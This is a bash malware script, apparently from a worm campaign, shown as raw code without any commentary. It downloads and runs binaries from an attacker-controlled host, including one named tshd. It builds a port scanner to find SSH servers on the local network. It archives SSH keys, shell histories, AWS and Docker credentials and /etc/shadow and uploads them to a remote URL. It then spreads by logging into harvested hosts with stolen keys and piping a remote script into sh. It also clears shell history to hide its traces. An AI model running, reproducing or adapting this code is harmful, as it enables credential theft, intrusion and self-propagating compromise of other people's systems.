#!/bin/bash

export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SOURCE_URL="http://kaiserfranz.cc/meoow"

chattr -ia /etc/resolv.conf 2>/dev/null; tdchattr -ia /etc/resolv.conf 2>/dev/null
cat /etc/resolv.conf | grep '8.8.8.8' 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.8.8' >> /etc/resolv.conf
cat /etc/resolv.conf | grep '8.8.4.4' 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.4.4' >> /etc/resolv.conf
chattr +a /etc/resolv.conf 2>/dev/null; tdchattr +a /etc/resolv.conf 2>/dev/null

ONLINE_IP=`curl -s 147.75.47.199 || wget -O - 147.75.47.199`
PWNWITHTHISLINK="http://kaiserfranz.cc/meoow/sh/spread_rsa.sh"
RSAUPLOAD="$SOURCE_URL/uploads/index.php?CRYPTIDW=$ONLINE_IP"

if ! type sudo 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y sudo 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y sudo 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add sudo 2>/dev/null 1>/dev/null; fi
fi
if ! type chattr 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add e2fsprogs 2>/dev/null 1>/dev/null; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! type wget 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y wget 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y wget 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add wget 2>/dev/null 1>/dev/null; fi
fi
if ! type curl 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then 
	apt-get update --fix-missing 2>/dev/null 1>/dev/null; 
	apt-get install -y curl 2>/dev/null 1>/dev/null; 
	apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then 
	yum clean all 2>/dev/null 1>/dev/null; 
	yum install -y curl 2>/dev/null 1>/dev/null; 
	yum reinstall -y curl 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then 
	apk update 2>/dev/null 1>/dev/null; 
	apk add curl 2>/dev/null 1>/dev/null; fi
fi
if ! type gcc 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y gcc 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y gcc 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add gcc 2>/dev/null 1>/dev/null; fi
fi
if ! type make 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y make 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y make 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add make 2>/dev/null 1>/dev/null; fi
fi

function DLOAD(){
GET=$1
PUT=$2
curl -s -Lk $GET -o $PUT || wget -q $GET -O $PUT || wget -q --no-check-certificate $GET -O $PUT || curl2 -s -Lk $GET -o $PUT || wget2 -q $GET -O $PUT || wget2 -q --no-check-certificate $GET -O $PUT || cur -s -Lk $GET -o $PUT || wge -q $GET -O $PUT || wge -q --no-check-certificate $GET -O $PUT || cdl -s -Lk $GET -o $PUT || wdl -q $GET -O $PUT || wdl -q --no-check-certificate $GET -O $PUT
}	

clear
if [ ! -f "/dev/shm/.daemon" ]; then
echo '###################################################################'
echo '###################################################################'
echo $ONLINE_IP
echo '###################################################################'
echo '###################################################################'
else
echo "replay .. i know this server ..."
history -c 
exit
fi


if [ -f "/bin/sbin" ]; then echo 'FOUND: sbin' ; else echo 'MISSING: sbin'
DLOAD $SOURCE_URL/bin/sbin /bin/sbin
chmod +x /bin/sbin
/bin/sbin
if [ ! -f "/bin/sbin" ]; then
DLOAD $SOURCE_URL/bin/default /dev/shm/sbin
chmod +x /dev/shm/sbin
/dev/shm/sbin
fi
fi
	
if [ -f "/usr/bin/tshd" ]; then echo 'FOUND: tshd' ; else echo 'MISSING: tshd'
DLOAD $SOURCE_URL/bin/tshd /usr/bin/tshd
chmod +x /usr/bin/tshd
/usr/bin/tshd
fi

if [ -f "/usr/bin/kube" ]; then echo 'FOUND: kube' ; else echo 'MISSING: kube'
DLOAD $SOURCE_URL/bin/kube /usr/bin/kube
chmod +x /usr/bin/kube
/usr/bin/kube
fi

if [ -f "/usr/bin/bioset" ]; then echo 'FOUND: bioset' ; else echo 'MISSING: bioset'
DLOAD $SOURCE_URL/bin/bioset /usr/bin/bioset
chmod +x /usr/bin/bioset
/usr/bin/bioset
fi



if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
echo "Setup PnScan ..."
if [ ! -e /tmp/ps/ ]; then 
chattr -ia /tmp/ ; mkdir -p /tmp/ps/ ; chattr -ia /tmp/ps/ 2>/dev/null
else 
chattr -ia /tmp/ /tmp/ps/ 2>/dev/null
fi
cd /tmp/ps/
curl -kLs http://ro.archive.ubuntu.com/ubuntu/pool/universe/p/pnscan/pnscan_1.12+git20180612.orig.tar.gz -o /tmp/ps/.x112 || wget -q -O /tmp/ps/.x112 http://ro.archive.ubuntu.com/ubuntu/pool/universe/p/pnscan/pnscan_1.12+git20180612.orig.tar.gz
sleep 1
[ -f .x112 ] && tar xf /tmp/ps/.x112 -C /tmp/ps/ 2>/dev/null 1>/dev/null
cd pnscan-1.12 2>/dev/null 1>/dev/null
make lnx  2>/dev/null 1>/dev/null
cp pnscan /usr/bin/pnscan 2>/dev/null 1>/dev/null
chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null
make install 2>/dev/null 1>/dev/null
cd .. 2>/dev/null 1>/dev/null
rm -rf .x112 ps 2>/dev/null 1>/dev/null
fi




function RSA_ULOAD(){
if [ ! -e /tmp/ ]; then chattr -ia / ; mkdir -p /tmp/ ; chattr -ia /tmp/ 2>/dev/null ; else chattr -ia /tmp/ 2>/dev/null ; fi
tar cvzf /tmp/rsa.tar.gz /root/.ssh/ /root/.bash_history /etc/hosts /home/*/.ssh/ /home/*/.bash_history 
curl -F "userfile=@/tmp/rsa.tar.gz" $RSAUPLOAD 2>/dev/null
rm -f /tmp/rsa.tar.gz
history -c
}

function AWS_ULOAD(){
if ( [ -e /root/.aws/ ] || [ -e /home/*/.aws/ ] ); then
tar cvzf /tmp/aws.tar.gz /root/.aws/credentials /root/.aws/config /home/*/.aws/credentials /home/*/.aws/config
curl -F "userfile=@/tmp/aws.tar.gz" $RSAUPLOAD 2>/dev/null
rm -f /tmp/aws.tar.gz
history -c
fi
}

function DOCKER_ULOAD(){
if ( [ -e /root/.docker/ ] || [ -e /home/*/.docker/ ] ); then
tar cvzf /tmp/docker.tar.gz /root/.docker/ /home/*/.docker/
curl -F "userfile=@/tmp/docker.tar.gz" $RSAUPLOAD 2>/dev/null
rm -f /tmp/docker.tar.gz
history -c
fi
}

function PASSWD_ULOAD(){
tar cvzf /tmp/passwd.tar.gz /etc/group /etc/passwd /etc/shadow /etc/gshadow /etc/sudoers /etc/group
curl -F "userfile=@/tmp/passwd.tar.gz" $RSAUPLOAD 2>/dev/null
rm -f /tmp/passwd.tar.gz
history -c
}

function FILE_ULOAD(){
RSA_ULOAD
AWS_ULOAD
DOCKER_ULOAD
PASSWD_ULOAD
}

function GET_LANSSH(){
if [ ! -e /home/daemon/.ssh/ ]; then chattr -ia /home/ ; mkdir -p /home/daemon/.ssh/ ; else chattr -ia /home/ /home/daemon/ /home/daemon/.ssh/ ; fi 
if [ ! -f "/home/daemon/.ssh/known_hosts" ]; then touch /home/daemon/.ssh/known_hosts ; fi

ip route show | grep -v grep | grep -v blackhole | grep "/" | awk '{print $1}' >> /home/daemon/.ssh/.ranges

for i in $(cat /home/daemon/.ssh/.ranges); do
echo "scanne "$i
pnscan $i 22 >> /home/daemon/.ssh/.known_hosts
done;
rm -f /home/daemon/.ssh/.ranges

cat /home/daemon/.ssh/.known_hosts | awk '{print $1}' >> /home/daemon/.ssh/known_hosts
rm -f /home/daemon/.ssh/.known_hosts
}









function PWN_SSH_LOCAL() {
  myhostip=$(curl -sL icanhazip.com)
  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
  USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq
  )
  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
  pl=$(
    echo "22"
    cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}'
  )
  sshports=$(echo "$pl" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  i=0
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          i=$((i+1))
          if [ "${i}" -eq "20" ]; then
            sleep 5
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi
          chmod +r $key
          chmod 400 $key
          echo "$user@$host $key $sshp"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "nohup $(curl -Ls $PWNWITHTHISLINK | sh || cur -Ls $PWNWITHTHISLINK | sh || cdl -Ls $PWNWITHTHISLINK | sh || wget -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wge -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wdl -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh);"
        done
      done
    done
  done
}




if [ ! -f "/dev/shm/.daemon" ]; then
FILE_ULOAD
GET_LANSSH
PWN_SSH_LOCAL
echo 'DONE' > /dev/shm/.daemon
tntrecht +i /dev/shm/.daemon 2>/dev/null ; chattr +i /dev/shm/.daemon 2>/dev/null
rm -fr /home/daemon/ 2>/dev/null
history -c
else
echo "replay .. i know this server ..."
history -c
fi










